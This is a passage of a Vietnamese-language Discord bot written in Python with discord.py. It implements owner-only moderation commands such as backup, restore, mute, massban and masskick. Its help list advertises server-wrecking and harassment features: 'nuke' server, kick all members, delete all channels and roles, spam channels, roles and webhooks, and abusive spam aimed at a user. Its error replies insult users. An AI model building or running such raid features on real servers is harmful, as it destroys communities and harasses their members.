        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

# ==================== LỆNH ADMINCMD ====================
@bot.command(name="admincmd")
@is_bot_owner()
async def admin_commands(ctx):
    """📋 Danh sách tất cả lệnh quản trị"""
    all_commands = [
        "`nuked kick @user` - Kick thành viên",
        "`nuked ban @user` - Ban thành viên",
        "`nuked unban <id>` - Unban thành viên",
        "`nuked createchannel <tên>` - Tạo kênh mới",
        "`nuked deletechannel #kênh` - Xóa kênh",
        "`nuked purge all` - Xóa toàn bộ tin nhắn",
        "`nuked role @user <role>` - Thêm role",
        "`nuked removerole @user <role>` - Xóa role",
        "`nuked lock #kênh` - Khóa kênh",
        "`nuked unlock #kênh` - Mở khóa kênh",
        "`nuked mute @user [thời gian]` - Mute thành viên",
        "`nuked unmute @user` - Unmute thành viên",
        "`nuked warn @user` - Cảnh cáo thành viên",
        "`nuked clear <số>` - Xóa tin nhắn",
        "`nuked spam @user` - Spam chửi",
        "`nuked stop` - Dừng spam",
        "`nuked kickall` - Kick toàn bộ",
        "`nuked deleteallchannels` - Xóa tất cả kênh",
        "`nuked deleteallroles` - Xóa tất cả role",
        "`nuked spamroles` - Tạo role spam",
        "`nuked spamchannels` - Tạo kênh spam",
        "`nuked setservername` - Đổi tên server",
        "`nuked setservericon` - Đổi icon server",
        "`nuked addrole <tên>` - Tạo role mới",
        "`nuked showsv` - Xem danh sách server",
        "`nuked nuke` - NUKE SERVER",
        "`nuked setup` - Bảng điều khiển",
        "`nuked log #kênh` - Cài kênh log",
        "`nuked channelslv #kênh` - Cài kênh level",
        "`nuked setlv <level> @user` - Set level",
        "`nuked lv @user` - Xem level",
        "`nuked setwelcome #kênh` - Cài kênh chào mừng",
        "`nuked setgoodbye #kênh` - Cài kênh tạm biệt",
        "`nuked backup` - Backup server",
        "`nuked restore` - Khôi phục server từ backup",
        "`nuked slowmode <giây>` - Bật slowmode",
        "`nuked nick @user <tên>` - Đổi nickname",
        "`nuked resetnick @user` - Reset nickname",
        "`nuked vc <tên>` - Tạo voice channel",
        "`nuked hide #kênh` - Ẩn kênh",
        "`nuked reveal #kênh` - Hiện kênh",
        "`nuked rename <tên>` - Đổi tên server",
        "`nuked icon [url]` - Đổi icon server",
        "`nuked emoji` - Xem danh sách emoji",
        "`nuked steal <id> <tên>` - Copy emoji",
        "`nuked moveall #voice` - Di chuyển tất cả voice",
        "`nuked massban <@user1 @user2 ...>` - Ban nhiều người",
        "`nuked masskick <@user1 @user2 ...>` - Kick nhiều người",
        "`nuked clonechannel #kênh` - Clone kênh",
        "`nuked webhookspam` - Spam qua webhook",
        "`nuked serverinfo` - Thông tin server",
        "`nuked userinfo @user` - Thông tin user",
        "`nuked avatar @user` - Lấy avatar",
        "`nuked off [lệnh]` - Tắt lệnh hoặc bot",
        "`nuked on [lệnh]` - Bật lệnh hoặc thông báo bot đang hoạt động"
    ]
    embed = discord.Embed(
        title="👑 DANH SÁCH LỆNH QUẢN TRỊ",
        description="📋 Tất cả lệnh dành cho Boss Bảo (mỗi field hiển thị một phần):",
        color=0xFFD700
    )
    chunk_size = 15
    for i in range(0, len(all_commands), chunk_size):
        chunk = all_commands[i:i+chunk_size]
        field_name = f"📌 Nhóm {i//chunk_size + 1}"
        field_value = "\n".join(chunk)
        embed.add_field(name=field_name, value=field_value, inline=False)
    embed.set_footer(text="Độc quyền phục vụ Boss Bảo 💖")
    await ctx.send(embed=embed)

# ==================== LỆNH OFF & ON ====================
@bot.command(name="off")
@is_bot_owner()
async def off_command(ctx, *, command_name: str = None):
    """🔴 Tắt bot hoặc tắt một lệnh cụ thể"""
    global bot_enabled
    if command_name is None:
        bot_enabled = False
        await ctx.send("🛑 Boss Bảo đã tạm dừng bot. Gõ `nuked on` để bật lại.")
        return
    cmd = bot.get_command(command_name.lower())
    if cmd is None:
        await ctx.send(f"❌ Không tìm thấy lệnh `{command_name}`!")
        return
    if cmd.name in ["off", "on"]:
        await ctx.send("❌ Không thể tắt lệnh `off` hoặc `on`!")
        return
    if cmd.name in DISABLED_COMMANDS:
        await ctx.send(f"❌ Lệnh `{cmd.name}` đã bị tắt rồi!")
        return
    DISABLED_COMMANDS.add(cmd.name)
    save_config()
    await ctx.send(f"✅ Đã tắt lệnh `{cmd.name}`! Gõ `nuked on {cmd.name}` để bật lại.")

@off_command.error
async def off_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="on")
@is_bot_owner()
async def on_command(ctx, *, command_name: str = None):
    """🟢 Bật bot hoặc bật lại một lệnh đã tắt"""
    global bot_enabled
    if command_name is None:
        if bot_enabled:
            await ctx.send("🤖 Bot đang hoạt động bình thường!")
        else:
            bot_enabled = True
            await ctx.send("✅ Bot đã hoạt động trở lại!")
        return
    cmd = bot.get_command(command_name.lower())
    if cmd is None:
        await ctx.send(f"❌ Không tìm thấy lệnh `{command_name}`!")
        return
    if cmd.name not in DISABLED_COMMANDS:
        await ctx.send(f"❌ Lệnh `{cmd.name}` không bị tắt!")
        return
    DISABLED_COMMANDS.remove(cmd.name)
    save_config()
    await ctx.send(f"✅ Đã bật lại lệnh `{cmd.name}`!")

@on_command.error
async def on_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== GLOBAL CHECK: KIỂM TRA LỆNH BỊ TẮT ====================
@bot.check
async def globally_disabled_check(ctx):
    if not bot_enabled:
        if ctx.command and ctx.command.name != "on":
            await ctx.send("🛑 Bot đang tạm dừng. Gõ `nuked on` để bật lại.")
            return False
    if ctx.command and ctx.command.name in DISABLED_COMMANDS:
        await ctx.send(f"❌ Lệnh `{ctx.command.name}` đã bị tắt bởi Boss Bảo. Gõ `nuked on {ctx.command.name}` để bật lại.")
        return False
    return True

# ==================== LỆNH BACKUP ====================
@bot.command(name="backup")
@is_bot_owner()
async def backup_server(ctx):
    """💾 Backup cấu hình server (kênh và role)"""
    await ctx.send("⏳ Đang backup server...")
    try:
        guild = ctx.guild
        backup_data = {
            "name": guild.name,
            "channels": [],
            "roles": []
        }
        for channel in guild.channels:
            backup_data["channels"].append({
                "name": channel.name,
                "type": str(channel.type),
                "position": channel.position
            })
        for role in guild.roles:
            if role.name != "@everyone":
                backup_data["roles"].append({
                    "name": role.name,
                    "color": str(role.color),
                    "permissions": role.permissions.value
                })
        filename = f"backup_{guild.id}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(backup_data, f, indent=2, ensure_ascii=False)
        embed = discord.Embed(
            title="✅ ĐÃ BACKUP SERVER",
            description=f"📌 **Server:** {guild.name}\n📂 Đã backup `{len(backup_data['channels'])}` kênh và `{len(backup_data['roles'])}` role",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống backup Boss Bảo 💖")
        await ctx.send(embed=embed, file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@backup_server.error
async def backup_server_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== VIEW XÁC NHẬN RESTORE ====================
class RestoreConfirmView(discord.ui.View):
    def __init__(self, ctx, backup_data, filename):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.backup_data = backup_data
        self.filename = filename

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

    @discord.ui.button(label="✅ ĐỒNG Ý RESTORE", style=discord.ButtonStyle.green)
    async def confirm_restore(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏳ Đang khôi phục server...", ephemeral=True)
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()
        await restore_process(self.ctx, self.backup_data, self.filename)

    @discord.ui.button(label="❌ HỦY", style=discord.ButtonStyle.red)
    async def cancel_restore(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message("❌ Đã hủy lệnh restore.", ephemeral=True)
        self.stop()

async def restore_process(ctx, backup_data, filename):
    try:
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
        for role_data in backup_data.get("roles", []):
            perms = discord.Permissions(role_data["permissions"])
            try:
                color_hex = role_data.get("color", "#000000")
                if color_hex.startswith("#"):
                    color = discord.Color(int(color_hex.strip("#"), 16))
                else:
                    color = discord.Color.default()
            except:
                color = discord.Color.default()
            try:
                await guild.create_role(
                    name=role_data["name"],
                    permissions=perms,
                    color=color,
                    hoist=True
                )
            except:
                pass
        for channel_data in backup_data.get("channels", []):
            name = channel_data["name"]
            ctype = channel_data["type"]
            position = channel_data.get("position", 0)
            try:
                if ctype == "text":
                    await guild.create_text_channel(name=name, position=position)
                elif ctype == "voice":
                    await guild.create_voice_channel(name=name, position=position)
            except:
                pass
        embed = discord.Embed(
            title="✅ ĐÃ RESTORE SERVER",
            description=f"🎉 Server **{guild.name}** đã được khôi phục từ file `{filename}`.",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống restore Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi khi restore: {str(e)}")

# ==================== LỆNH RESTORE ====================
@bot.command(name="restore")
@is_bot_owner()
async def restore_server(ctx, file_name: str = None):
    """🔄 Khôi phục server từ file backup"""
    try:
        if file_name is None:
            file_name = f"backup_{ctx.guild.id}.json"
        if not os.path.exists(file_name):
            await ctx.send(f"❌ Không tìm thấy file backup `{file_name}`. Hãy chạy `nuked backup` trước.")
            return
        with open(file_name, "r", encoding="utf-8") as f:
            backup_data = json.load(f)
        embed = discord.Embed(
            title="⚠️ **XÁC NHẬN RESTORE SERVER** ⚠️",
            description=(
                f"Bạn sắp khôi phục server **{ctx.guild.name}** từ file `{file_name}`.\n"
                f"**Hành động này sẽ xóa TOÀN BỘ kênh và role hiện tại** (trừ @everyone).\n"
                f"Số kênh sẽ tạo: `{len(backup_data.get('channels', []))}`\n"
                f"Số role sẽ tạo: `{len(backup_data.get('roles', []))}`\n\n"
                "Bạn có chắc chắn không?"
            ),
            color=0xFF0000
        )
        embed.set_footer(text="Boss Bảo - Hệ thống khôi phục")
        view = RestoreConfirmView(ctx, backup_data, file_name)
        await ctx.send(embed=embed, view=view)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@restore_server.error
async def restore_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH SLOWMODE ====================
@bot.command(name="slowmode")
@is_bot_owner()
async def set_slowmode(ctx, seconds: int = 0):
    """🐢 Cài slowmode cho kênh hiện tại"""
    if seconds < 0 or seconds > 21600:
        await ctx.send("❌ Nhập từ 0 đến 21600 giây!")
        return
    try:
        await ctx.channel.edit(slowmode_delay=seconds)
        embed = discord.Embed(
            title="🐢 ĐÃ CÀI SLOWMODE",
            description=f"📌 **Kênh:** {ctx.channel.mention}\n⏳ **Slowmode:** {seconds} giây\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00 if seconds > 0 else 0xFF9900
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_slowmode.error
async def set_slowmode_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH NICK ====================
@bot.command(name="nick")
@is_bot_owner()
async def set_nickname(ctx, member: discord.Member, *, nickname: str = None):
    """✏️ Đổi nickname cho thành viên"""
    if nickname is None:
        await ctx.send("❌ Vui lòng nhập nickname! VD: `nuked nick @user Tên mới`")
        return
    try:
        old_name = member.display_name
        await member.edit(nick=nickname)
        embed = discord.Embed(
            title="✏️ ĐÃ ĐỔI NICKNAME",
            description=f"👤 **Người:** {member.mention}\n📝 **Tên cũ:** `{old_name}`\n📝 **Tên mới:** `{nickname}`\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_nickname.error
async def set_nickname_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH RESETNICK ====================
@bot.command(name="resetnick")
@is_bot_owner()
async def reset_nickname(ctx, member: discord.Member):
    """🔄 Reset nickname của thành viên về tên gốc"""
    try:
        await member.edit(nick=None)
        embed = discord.Embed(
            title="🔄 ĐÃ RESET NICKNAME",
            description=f"👤 **Người:** {member.mention}\n📝 Đã reset về tên gốc\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@reset_nickname.error
async def reset_nickname_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH VC ====================
@bot.command(name="vc")
@is_bot_owner()
async def create_voice_channel(ctx, *, name: str):
    """🔊 Tạo kênh voice mới"""
    try:
        channel = await ctx.guild.create_voice_channel(name)
        embed = discord.Embed(
            title="🔊 ĐÃ TẠO VOICE CHANNEL",
            description=f"📌 **Tên:** {channel.mention}\n👑 **Người tạo:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_voice_channel.error
async def create_voice_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH HIDE ====================
@bot.command(name="hide")
@is_bot_owner()
async def hide_channel(ctx, channel: discord.TextChannel = None):
    """🙈 Ẩn kênh khỏi mọi người"""
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, view_channel=False)
        embed = discord.Embed(
            title="🙈 ĐÃ ẨN KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔒 Chỉ admin mới thấy được!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@hide_channel.error
async def hide_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH REVEAL ====================
@bot.command(name="reveal")
@is_bot_owner()
async def reveal_channel(ctx, channel: discord.TextChannel = None):
    """👀 Hiện kênh cho mọi người"""
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, view_channel=True)
        embed = discord.Embed(
            title="👀 ĐÃ HIỆN KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔓 Mọi người đã thấy được!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@reveal_channel.error
async def reveal_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH RENAME ====================
@bot.command(name="rename")
@is_bot_owner()
async def rename_server(ctx, *, new_name: str):
    """✏️ Đổi tên server (alias của setservername)"""
    if len(new_name) > 100:
        new_name = new_name[:100]
    try:
        old_name = ctx.guild.name
        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(
            title="✏️ ĐÃ ĐỔI TÊN SERVER",
            description=f"📝 **Tên cũ:** `{old_name}`\n📝 **Tên mới:** `{new_name}`\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@rename_server.error
async def rename_server_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH ICON ====================
@bot.command(name="icon")
@is_bot_owner()
async def set_icon(ctx, url: str = None):
    """🖼️ Đổi icon server (alias của setservericon)"""
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                await ctx.send("❌ URL không hợp lệ!")
                return
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        await ctx.send("❌ Không tải được ảnh!")
                        return
                    image_data = await resp.read()
        elif ctx.message.attachments:
            image_data = await ctx.message.attachments[0].read()
        else:
            await ctx.send("❌ Vui lòng upload ảnh hoặc nhập URL!")
            return
        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(
            title="🖼️ ĐÃ ĐỔI ICON SERVER",
            description=f"✅ Icon đã được cập nhật!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_icon.error
async def set_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH EMOJI ====================
@bot.command(name="emoji")
@is_bot_owner()
async def list_emoji(ctx):
    """🎨 Xem danh sách emoji của server"""
    emojis = ctx.guild.emojis
    if not emojis:
        await ctx.send("📭 Server này chưa có emoji nào!")
        return
    emoji_list = []
    for e in emojis:
        emoji_list.append(f"{e} - `{e.name}`")
    embed = discord.Embed(
        title=f"🎨 DANH SÁCH EMOJI ({len(emojis)} emoji)",
        description="\n".join(emoji_list[:25]),
        color=0x00CCFF
    )
    if len(emoji_list) > 25:
        embed.set_footer(text=f"Hiển thị 25/{len(emoji_list)} emoji. Dùng nuked emoji để xem thêm.")
    else:
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
    await ctx.send(embed=embed)

@list_emoji.error
async def list_emoji_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH STEAL ====================
@bot.command(name="steal")
@is_bot_owner()
async def steal_emoji(ctx, emoji_id: int, *, name: str = None):
    """🎨 Copy emoji từ server khác về server hiện tại"""
    if name is None:
        name = f"emoji_{emoji_id}"
    try:
        emoji = await bot.fetch_emoji(emoji_id)
        if not emoji:
            await ctx.send("❌ Không tìm thấy emoji!")
            return
        async with aiohttp.ClientSession() as session:
            async with session.get(emoji.url) as resp:
                if resp.status != 200:
                    await ctx.send("❌ Không tải được ảnh!")
                    return
                image_data = await resp.read()
        new_emoji = await ctx.guild.create_custom_emoji(name=name, image=image_data)
        embed = discord.Embed(
            title="🎨 ĐÃ COPY EMOJI",
            description=f"✅ {new_emoji} - `{new_emoji.name}`\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@steal_emoji.error
async def steal_emoji_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH MOVEALL ====================
@bot.command(name="moveall")
@is_bot_owner()
async def move_all_voice(ctx, channel: discord.VoiceChannel = None):
    """🚪 Di chuyển tất cả thành viên trong voice đến kênh chỉ định"""
    if channel is None:
        await ctx.send("❌ Vui lòng tag voice channel! VD: `nuked moveall #voice`")
        return
    try:
        count = 0
        for vc in ctx.guild.voice_channels:
            for member in vc.members:
                await member.move_to(channel)
                count += 1
                await asyncio.sleep(0.1)
        embed = discord.Embed(
            title="🚪 ĐÃ DI CHUYỂN TẤT CẢ",
            description=f"✅ Đã di chuyển **{count}** người vào {channel.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@move_all_voice.error
async def move_all_voice_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH MUTE ====================
@bot.command(name="mute")
@is_bot_owner()
async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Không có lý do"):
    """🔇 Mute thành viên (có thể đặt thời gian)"""
    try:
        time_delta = None
        duration_text = "Vĩnh viễn"
        if duration:
            unit = duration[-1].lower()
            try:
                val = int(duration[:-1])
            except ValueError:
                await ctx.send("❌ Sai định dạng thời gian! Ví dụ: `10m` (phút), `2d` (ngày), `1w` (tuần), `1t` (tháng).")
                return
            if unit == 'm':
                time_delta = timedelta(minutes=val)
                duration_text = f"{val} phút"
            elif unit == 'd':
                time_delta = timedelta(days=val)
                duration_text = f"{val} ngày"
            elif unit == 'w':
                time_delta = timedelta(weeks=val)
                duration_text = f"{val} tuần"
            elif unit == 't':
                time_delta = timedelta(days=val * 30)
                duration_text = f"{val} tháng"
            else:
                await ctx.send("❌ Đơn vị thời gian không hợp lệ! Dùng: **m** (phút), **d** (ngày), **w** (tuần), **t** (tháng).")
                return
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if not muted_role:
            muted_role = await ctx.guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False, speak=False))
            for channel in ctx.guild.channels:
                try:
                    await channel.set_permissions(muted_role, send_messages=False, speak=False)
                except:
                    pass
        await member.add_roles(muted_role, reason=f"Lệnh từ Boss Bảo - {reason}")
        if time_delta:
            try:
                await member.timeout(time_delta, reason=reason)
            except:
                pass
        embed = discord.Embed(
            title="🔇 🌈 **ĐÃ MUTE THÀNH VIÊN** 🌈",
            description=f"👤 **Thành viên:** {member.mention}\n⏳ **Thời gian:** {duration_text}\n📌 **Lý do:** {reason}",
            color=0xFF9900
        )
        await ctx.send(embed=embed)
        try:
            dm_embed = discord.Embed(
                title="🔇 **BẠN ĐÃ BỊ MUTE TRONG SERVER** 🔇",
                description=(
                    f"🏰 **Máy chủ:** {ctx.guild.name}\n"
                    f"⏳ **Thời hạn mute:** {duration_text}\n"
                    f"📌 **Lý do:** {reason}\n\n"
                    f"⚠️ Vui lòng rút kinh nghiệm và tuân thủ nội quy server để tránh bị xử phạt nặng hơn nhé!"
                ),
                color=0xFF0000
            )
            dm_embed.set_footer(text="Hệ thống kiểm duyệt độc quyền của Boss Bảo")
            await member.send(embed=dm_embed)
        except:
            pass
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@mute.error
async def mute_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH UNMUTE ====================
@bot.command(name="unmute")
@is_bot_owner()
async def unmute(ctx, member: discord.Member):
    """🔊 Bỏ mute thành viên"""
    try:
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        unmuted_status = False
        if muted_role and muted_role in member.roles:
            await member.remove_roles(muted_role, reason="Lệnh từ Boss Bảo")
            unmuted_status = True
        try:
            await member.timeout(None, reason="Lệnh unmute từ Boss Bảo")
            unmuted_status = True
        except:
            pass
        if unmuted_status:
            embed = discord.Embed(
                title="🔊 🌈 **ĐÃ BỎ MUTE THÀNH VIÊN** 🌈",
                description=f"👤 {member.mention} đã được bỏ mute và khôi phục quyền trò chuyện.",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
            try:
                dm_embed = discord.Embed(
                    title="🔊 **BẠN ĐÃ ĐƯỢC UNMUTE!** 🔊",
                    description=(
                        f"✨ Chúc mừng bạn! Lệnh cấm chat tại máy chủ **{ctx.guild.name}** đã được gỡ bỏ.\n"
                        f"🎉 Bạn có thể tiếp tục trò chuyện bình thường. Hãy giữ gìn nội quy server nhé!"
                    ),
                    color=0x00FF00
                )
                dm_embed.set_footer(text="Hệ thống kiểm duyệt độc quyền của Boss Bảo")
                await member.send(embed=dm_embed)
            except:
                pass
        else:
            await ctx.send("⚠️ Thành viên này hiện không bị mute.")
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unmute.error
async def unmute_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH WARN ====================
@bot.command(name="warn")
@is_bot_owner()
async def warn(ctx, member: discord.Member, *, reason="Cảnh cáo chung"):
    """⚠️ Gửi cảnh cáo đến thành viên qua DM"""
    try:
        embed = discord.Embed(
            title="⚠️ 🌈 **CẢNH CÁO TỪ BOSS BẢO** 🌈",
            description=f"Bạn đã bị cảnh cáo trong server **{ctx.guild.name}**\n📌 Lý do: {reason}",
            color=0xFF0000
        )
        await member.send(embed=embed)
        await ctx.send(f"✅ Đã gửi cảnh cáo đến {member.mention}.")
    except:
        await ctx.send("❌ Không thể gửi tin nhắn riêng cho thành viên này.")

@warn.error
async def warn_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH CLEAR ====================
@bot.command(name="clear")
@is_bot_owner()
async def clear(ctx, amount: int = 10):
    """🧹 Xóa tin nhắn trong kênh hiện tại"""
    if amount < 1 or amount > 1000:
        await ctx.send("⚠️ Số lượng từ 1 đến 1000.")
        return
    try:
        deleted = await ctx.channel.purge(limit=amount)
        embed = discord.Embed(
            title="🧹 🌈 **ĐÃ XÓA TIN NHẮN** 🌈",
            description=f"Đã xóa {len(deleted)} tin nhắn.",
            color=0x00CCFF
        )
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH MASSBAN ====================
@bot.command(name="massban")
@is_bot_owner()
async def massban(ctx, *members: discord.Member):
    """🔨 Ban nhiều thành viên cùng lúc"""
    if not members:
        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `nuked massban @user1 @user2`")
        return
    success = 0
    failed = 0
    for member in members:
        if member.id == ctx.author.id or member.id in BOT_OWNERS or member == ctx.guild.owner:
            failed += 1
            continue
        try:
            await member.ban(reason="Mass ban từ Boss Bảo")
            success += 1
        except:
            failed += 1
    embed = discord.Embed(
        title="🔨 MASS BAN",
        description=f"✅ Đã ban **{success}** người\n❌ Thất bại: **{failed}** người",
        color=0xFF0000 if failed else 0x00FF00
    )
    embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
    await ctx.send(embed=embed)

@massban.error
async def massban_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH MASSKICK ====================
@bot.command(name="masskick")
@is_bot_owner()
async def masskick(ctx, *members: discord.Member):
    """👢 Kick nhiều thành viên cùng lúc"""
    if not members:
        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `nuked masskick @user1 @user2`")
        return
    success = 0
    failed = 0
    for member in members:
        if member.id == ctx.author.id or member.id in BOT_OWNERS or member == ctx.guild.owner:
            failed += 1
            continue
        try:
            await member.kick(reason="Mass kick từ Boss Bảo")
            success += 1
        except:
            failed += 1
    embed = discord.Embed(
        title="👢 MASS KICK",
        description=f"✅ Đã kick **{success}** người\n❌ Thất bại: **{failed}** người",
        color=0xFF9900 if failed else 0x00FF00
    )
    embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
    await ctx.send(embed=embed)

@masskick.error
async def masskick_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

